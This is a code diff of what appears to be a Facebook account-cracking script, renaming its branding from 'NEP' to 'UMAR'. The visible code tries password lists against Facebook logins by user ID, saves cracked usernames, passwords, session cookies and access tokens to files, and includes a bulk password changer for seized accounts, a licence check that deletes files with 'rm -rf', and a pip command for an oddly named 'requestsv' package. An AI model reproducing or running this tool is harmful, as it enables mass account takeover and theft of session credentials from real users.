@@ -36,7 +36,7 @@ try:
 	import requests
 except ModuleNotFoundError:
 	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requestsv')
-	#os.system("python NEP")
+	#os.system("python UMAR")
 
 try:
 	import bs4
@@ -179,7 +179,7 @@ def iAmApprovelSystem():
 		if str(bumper)+'|fuck' in server_keys:
 			status = 'fuck'
 			print(" [•] You Dont Have Permission To use this Tool ..")
-			os.system("rm -rf d64 d32 NEP")
+			os.system("rm -rf d64 d32 Cyber")
 			exit()
 	elif str(key) in server_keys:
 		if str(key)+'|ok' in server_keys:
@@ -417,7 +417,7 @@ class iAmMain:
 	def method1(self,uid,nm,pwx):
 		try:
 			global ok , cp , loop
-			sys.stdout.write('\r [NEP] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			sys.stdout.write('\r [UMAR] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
 			fn = nm.split(' ')[0]
 			try:
 				ln = nm.split(' ')[1]
@@ -482,7 +482,7 @@ class iAmMain:
 				elif 'www.facebook.com' in q['error']['message']:
 					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
-					open('/sdcard/NEP_M1_CP.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M1_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
 				else:
 					continue
@@ -551,16 +551,16 @@ class iAmMain:
 					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
 					token = q["access_token"]
 					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
-					p('\r\033[1;92m[NEP-OK] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
 					p(f" [•]\033[1;96m Cookie : {cok}\033[1;97m")
 					ok.append(uid)
-					open('/sdcard/NEP_M2_OK.txt','a').write(uid+'|'+pw+'\n')
-					open('/sdcard/NEP_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
+					open('/sdcard/UMAR_M2_OK.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
 					break
 				elif 'www.facebook.com' in q['error']['message']:
-					p('\r\033[1;91m[NEP-CP] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
-					open('/sdcard/NEP_M2_CP.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M2_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
 				else:
 					continue
@@ -572,7 +572,7 @@ class iAmMain:
 	def method3(self,uid,nm,pwx):
 		try:
 			global ok , cp , loop
-			sys.stdout.write('\r [NEP %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			sys.stdout.write('\r [UMAR %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
 			fn = nm.split(' ')[0]
 			try:
 				ln = nm.split(' ')[1]
@@ -625,15 +625,15 @@ class iAmMain:
 					token = q["access_token"]
 					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
 					open('/sdcard/COOKIES_TOKEN.txt','a').write(cok+'|'+token+'\n')
-					p('\r\033[1;92m[NEP-OK] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
 					ok.append(uid)
-					open('/sdcard/NEP-OK.txt','a').write(uid+'|'+pw+'\n')
-					open('/sdcard/NEP-COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
+					open('/sdcard/UMAR-OK.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR-COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
 					break
 				elif 'www.facebook.com' in q['error']['message']:
-					p('\r\033[1;91m[NEP-CP] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
-					open('/sdcard/NEP-CP.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR-CP.txt','a').write(uid+'|'+pw+'\n')
 					break
 				else:
 					continue
@@ -645,7 +645,7 @@ class iAmMain:
 	def method4(self,uid,nm,pwx):
 		try:
 			global ok , cp , loop
-			sys.stdout.write('\r [NEP] %s | M4 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			sys.stdout.write('\r [UMAR] %s | M4 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
 			fn = nm.split(' ')[0]
 			try:
 				ln = nm.split(' ')[1]
@@ -682,15 +682,15 @@ class iAmMain:
 					token = q["access_token"]
 					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
 					open('/sdcard/COOKIES_TOKEN.txt','a').write(cok+'|'+token+'\n')
-					p('\r\033[1;92m[NEP-OK] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
 					ok.append(uid)
-					open('/sdcard/NEP_M4_OK.txt','a').write(uid+'|'+pw+'\n')
-					open('/sdcard/NEP_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
+					open('/sdcard/UMAR_M4_OK.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
 					break
 				elif 'www.facebook.com' in q['error']['message']:
-					p('\r\033[1;91m[NEP-CP] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
-					open('/sdcard/NEP_M4_CP.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M4_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
 				else:
 					continue
@@ -702,7 +702,7 @@ class iAmMain:
 	def r_crack(self,uid,pwx):
 		try:
 			global ok , cp , loop
-			sys.stdout.write('\r [NEP] %s | Random\ OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			sys.stdout.write('\r [UMAR] %s | Random\ OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
 			for pw in pwx:
 				data = {"adid": str(uuid.uuid4()),
 "format": "json",
@@ -750,15 +750,15 @@ class iAmMain:
 				if "session_key" in q:
 					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
 					cookie = f"sb={sb};{coki}"
-					p('\r\033[1;92m[NEP-OK] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
 					ok.append(uid)
-					open('/sdcard/NEP_NUM_OK.txt','a').write(uid+'|'+pw+'\n')
-					open('/sdcard/NEP_NUM_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
+					open('/sdcard/UMAR_NUM_OK.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_NUM_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
 					break
 				elif 'www.facebook.com' in q['error']['message']:
-					p('\r\033[1;91m[NEP-CP] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
-					open('/sdcard/NEP_NUM_CP.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_NUM_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
 				else:
 					continue
@@ -923,7 +923,7 @@ class automation:
 		p(" [•] File Splitted Complete")
 	def iAmPasswordManager(self):
 		logo()
-		p(" [•] Password Changer By : NEP")
+		p(" [•] Password Changer By : UMAR")
 		line()
 		p(" [1] Change Passwords (Bulk) \n [2] Change Single Account Password \n [3] Change Default Password \n [B] Press B To Back ")
 		line()
@@ -945,9 +945,9 @@ class automation:
 		try:
 			iamdefaultpassword= open(".default_password.txt","r").read()
 		except FileNotFoundError:
-			iamdefaultpassword = "NEP@@@"
+			iamdefaultpassword = "UMAR@@@"
 		logo()
-		p(" [•] Password Changer By : NEP")
+		p(" [•] Password Changer By : UMAR")
 		line()
 		print(" [•] Default Password : %s "%(iamdefaultpassword))
 		line()
@@ -1017,9 +1017,9 @@ class automation:
 		try:
 			iamdefaultpassword= open(".default_password.txt","r").read()
 		except FileNotFoundError:
-			iamdefaultpassword = "NEP"
+			iamdefaultpassword = "UMAR"
 		logo()
-		p(" [•] Password Changer By : NEP ")
+		p(" [•] Password Changer By : UMAR ")
 		line()
 		print(" [•] Default Password : %s "%(iamdefaultpassword))
 		line()
@@ -1080,7 +1080,7 @@ class automation:
 		try:
 			iamdefaultpassword= open(".default_password.txt","r").read()
 		except FileNotFoundError:
-			iamdefaultpassword = "NEP786"
+			iamdefaultpassword = "UMAR786"
 		p(" [•] Default Password : %s"%(iamdefaultpassword))
 		line()
 		os.system("rm -rf .default_password.txt ")
